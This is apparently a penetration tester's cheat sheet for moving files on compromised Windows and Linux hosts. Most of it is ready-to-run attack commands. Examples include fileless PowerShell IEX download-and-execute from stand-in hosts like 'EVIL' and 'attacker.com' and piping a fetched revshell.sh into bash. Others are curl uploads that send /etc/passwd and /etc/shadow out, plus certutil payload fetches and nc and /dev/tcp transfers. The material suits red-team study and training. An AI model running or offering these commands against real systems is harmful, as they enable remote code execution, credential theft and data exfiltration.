### Checking file integrity
- Linux
```bash
md5sum myfile
```
- Windows
```powershell
Get-FileHas c:\temp\myfile -Algorithm md5
```

## Base64 encoded files transfer
- Linux (Encode)
```bash
cat myfile | base64 -w 0 ; echo
```
- Windows (Decode)
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTi..........LN213=")
```


# File transfer to/from Windows target
## Powershell - Web downloads
- Using `System.Net.WebClient` powershell class
### 1. DownloadFile method
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
### 2. DonwloadFileAsync method (same as above but non blocking)
```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```
### DownloadStrgin (Fileless)
- Using Invoke-Expression to run a script in memory
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.34/powerview.ps1')
```
- quick small one
```powershell
IEX (iwr 'http://EVIL/evil.ps1')
```
- same but with pipelined input
```powershell
(New-Object Net.WebClient).DownloadString('http://10.10.17.34/powerview.ps1') | IEX
```
### possible problems
- incomplete Internet Explorer installation -> user `-UseBasicParsing`
- untrusted SSL/TLS certificate -> `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

## SMB - `impacket-smbserver`
### setup smb share from linux
```bash
sudo impacket-smbserver share -smb2support /path/to/share
```
- Copy from windows
```bash
copy \\192.168.220.133\share\nc.exe
```
- if we get authentication errors due to the domain or machine policy
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
- copy from windows
```cmd
net use n: \\192.168.220.133\share /user:test test
```

## FTP - `pyftpdlib`
- Setup FTP 
```bash
sudo python3 -m pyftpdlib --port 21
```
- download from windows
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
- Using command file
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Get the commands in action
ftp -v -n -s:ftpcommand.txt
```
- Setup FTP for upload
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
- Upload from windows
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
- using command files
```powershell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt

# Trigger the upload
ftp -v -n -s:ftpcommand.txt
```

## Uploading from windows to Linux
### Encoding
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
### Decoding from Linux
```bash
echo <BASE64 BLOB> | base64 -d 
```

### Using python3 upload server
```bash
pip3 install uploadserver
python3 -m uploadserver
```
### Uploading via PSUpload.ps1
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
- Upload via `Invoke-FileUpload`
```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
### Uploading data via POST
- Prepare the b64 blob
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
- Post it to the webwerver
```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
- receive the blob
```bash
nc -lnvp 8000
```


# File transfer from/to Linux Target

### Web downloads using wget & curl
- `wget`
```bash
wget http://attacker.com/revshell.sh -O /tmp/revshell.sh
```
- `curl`
```bash

curl http://attacker.com/revshell.sh -o /tmp/revshell.sh
```
### Fileless `wget` & `curl` via piping
- `wget`
```bash
wget -qO- http://attacker.com/revshell.sh | bash
```
- `curl`
```bash
curl http://attacker.com/revshell.sh | bash
```

### Download via `bash`
- Connect to the target
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```
- GET request to the target file
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
- Print the response
```bash
cat <&3
```

### SSH
```bash
scp <FROM> <TO> 
scp plaintext@192.168.49.128:/root/myroot.txt /tmp/myroot.txt
```

### http`s` 
- Create a self-signed certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
- start the upload server with the cert
```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
- `UPLOAD FROM TARGET`
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Creating web server
- python3 
```bash
python3 -m http.server 80 -d /web/dir
```
- python2.7
```bash
python2.7 -m SimpleHTTPServer
```
- php
```bash
php -S 0.0.0.0:80
```
- ruby
```bash
ruby -run -ehttpd /web/dir -p80
```


# Language based file transfer

## Python
### Python2
#### Download:
```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Upload:
```bash
python2.7 -c "import urllib2; urllib2.urlopen('http://<TARGET_IP>:<PORT>/', open('<FILENAME>', 'rb').read())"
```
### Python3
#### Download
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Upload
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})
```
## PHP
### Download
#### `File_get_content()`
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### `Fopen()`
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

#### FILELESS php
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
### Upload
#### using `cURL`
```BASH
php -r '$c=curl_init("http://<TARGET_IP>/upload");curl_setopt($c,CURLOPT_POST,1);curl_setopt($c,CURLOPT_POSTFIELDS,["file"=>curl_file_create("file.txt")]);curl_exec($c);'
```
#### Raw POST
```BASH
php -r '$opts=["http"=>["method"=>"POST","header"=>"Content-type: application/octet-stream","content"=>file_get_contents("file.txt")]]; echo file_get_contents("http://<TARGET_IP>/",false,stream_context_create($opts));'
```

## Ruby || Perl
### Ruby download
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
### Ruby  Upload
```bash
ruby -rnet/http -e 'uri=URI("http://<TARGET_IP>/"); req=Net::HTTP::Post.new(uri); req.body=File.read("file.txt"); Net::HTTP.start(uri.hostname, uri.port){|h| h.request(req)}'
```
### Perl Download
```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
### Perl Upload
```bash
perl -MHTTP::Request::Common -MLWP::UserAgent -e '$ua=LWP::UserAgent->new; $ua->request(POST "http://<TARGET_IP>/", Content_Type=>"form-data", Content=>[f=>["file.txt"]])'
```
## Javascript
### Download
#### 1. Create `wget.js`
```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
#### 2. Execute the js code using `cscript.exe`
```powershell
cscript.exe /nologo wget.js
```
### Upload
```bash
node -e 'const fs=require("fs"); const req=require("http").request({method:"POST", host:"<TARGET_IP>", port:<PORT>}); fs.createReadStream("file.txt").pipe(req);'
```
## VBScript
### Download
#### 1. Create `wget.vbs`
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
	.type = 1
	.open
	.write
	xHttp.responseBody 
	.savetofile WScript.Arguments.Item(1), 2
end with
```
#### Execute it via `cscript.exe`
```powershell
cscript /nologo wget.vbs
```

### Upload
```powershell

mshta vbscript:Execute("Set x=CreateObject(""MSXML2.XMLHTTP""):x.Open ""POST"",""http://<TARGET_IP>/"",False:Set s=CreateObject(""ADODB.Stream""):s.Type=1:s.Open:s.LoadFromFile ""file.txt"":x.Send s.Read:Close")
```

# Miscellaneous 
## `nc`
### Upload to target
#### Attacker machine
```bash
nc -l -p 1234 < file_to_grab.txt
```
#### Target machine
```bash
nc <attacker-ip> 1234 > local_copy.txt
```
### Download from target
#### Attacker machine
```bash
nc <target-ip> 1234 > goturfile.txt
```
#### Target machine
```bash
nc -l -p 1234 < goturfile.txt
```

## `bash`
### Download
#### Target machine
```bash
cat file > /dev/tcp/<IP>/<PORT>
```
#### Attacker machine (Receive)
```bash
cat < /dev/tcp/<IP>/<PORT> > file
```

- Reverse them with `upload`
## Winows Related
### `certutil`
```cmd
certutil -urlcache -f http://<MY_IP>/payload.exe C:\Temp\payload.exe
```
### `bitsadmin`
```cmd
bitsadmin /transfer myJob http://<MY_IP>/file.zip C:\Temp\file.zip
```
### `PSRemote Session`
- First we need to  establish PSRemote session
#### Upload
```powershell
$s = New-PSSession -ComputerName <TARGET_IP> -Credential <USER> Copy-Item -Path "C:\local\file.txt" -Destination "C:\remote\path" -ToSession $s
```
#### Download
```bash
Copy-Item -Path "C:\remote\file.txt" -Destination "C:\local\path\" -FromSession $s
```
# Living Off the Land Binaries
- We can utilize the already pre-installed binaries in Both windows and Linux to transfer files
For Winows Refer to [LOLBAS](https://lolbas-project.github.io/) And for Linux Refer to [GTFOBins](https://gtfobins.org/)

